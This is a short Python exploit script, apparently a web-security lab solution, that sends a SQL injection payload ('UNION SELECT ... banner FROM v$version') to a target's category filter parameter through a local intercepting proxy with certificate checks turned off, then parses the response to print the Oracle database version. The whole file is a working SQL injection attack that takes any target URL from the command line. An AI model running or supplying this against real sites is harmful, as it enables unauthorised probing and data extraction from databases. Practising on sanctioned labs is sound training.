import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080",
    }
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def exopit_sqli(url):
    path = "/filter?category="
    payload = "'+UNION+SELECT+'a',banner+FROM+v$version--"
    response = requests.get(url+path+payload, verify=False,proxies=proxies)
    result = response.text
    if "Database" in result and response.status_code ==200:
        print("(+) Found database version.")
        soup = BeautifulSoup(result,"html.parser")
        version = soup.find(string= re.compile('.*\sDatabase.*'))
        print("(+) The database version is: %s" %version)
        return True
    return False




if __name__ == "__main__":
    try:

        url = sys.argv[1]
    except:
        print("(-) Usage: %s <url>" % sys.argv[0])
        print("(-) Example: %s https://www.example.com  " % sys.argv[0])
        sys.exit(-1)
    print("(+) Dumping the version of the database ...")
    if not exopit_sqli(url):
        print("(-) Something went wrong")
